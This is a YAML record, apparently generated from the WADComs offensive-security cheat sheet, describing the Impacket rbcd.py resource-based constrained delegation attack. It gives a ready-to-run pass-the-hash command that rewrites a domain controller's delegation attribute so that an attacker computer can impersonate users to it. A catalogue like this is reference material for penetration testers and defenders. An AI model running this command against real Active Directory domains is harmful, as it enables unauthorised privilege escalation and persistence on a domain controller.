@@ -1,0 +1,124 @@
+id: wadcoms/Impacket-RBCD
+type: technique
+platform: active-directory
+name: Impacket RBCD
+phases:
+- execution
+- privilege-escalation
+- persistence
+capabilities:
+- command-execution
+- privilege-escalation
+- persistence
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid username
+- an NTLM hash (pass-the-hash)
+commands:
+- template: python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1
+    -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
+  comment: "Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target\
+    \ computer with security descriptor of another computer.\nThe following command adds the related security\
+    \ descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property\
+    \ of DC01.\nThis basically means that EVILCOMPUTER can get impersonated service tickets for DC01 using\
+    \ getST.py.\n\nCommand Reference:\n\n  Target IP: 10.10.10.1\n\n  Domain: test.local\n\n  Username:\
+    \ john\n\n  Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA\n\n  Delegate To: DC01$\n\n  Delegate From: EVILCOMPUTER$\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py
+- https://github.com/tothi/rbcd-attack
+tags:
+- active-directory
+- wadcoms
+- kerberos
+- smb
+- ldap
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-RBCD.md
+      document: "---\ndescription: |\n  Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity\
+        \ property of a target computer with security descriptor of another computer.\n  The following\
+        \ command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity\
+        \ property of DC01.\n  This basically means that EVILCOMPUTER can get impersonated service tickets\
+        \ for DC01 using getST.py.\n\n  Command Reference:\n\n    Target IP: 10.10.10.1\n\n    Domain:\
+        \ test.local\n\n    Username: john\n\n    Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA\n\n    Delegate\
+        \ To: DC01$\n\n    Delegate From: EVILCOMPUTER$\n\ncommand: |\n  python3 rbcd.py -action write\
+        \ -delegate-to \"DC01$\" -delegate-from \"EVILCOMPUTER$\" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA\
+        \ test.local/john\nitems:\n  - Username\n  - Hash\nservices:\n  - Kerberos\n  - SMB\n  - LDAP\n\
+        OS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n  - PrivEsc\n  - Persistence\nreferences:\n\
+        \  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py\n  - https://github.com/tothi/rbcd-attack\n\
+        ---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Persistence'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Persistence'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:8118cb779161217ec7ca869b7d3e63853c180854dc206ca88415a4d2774989d2
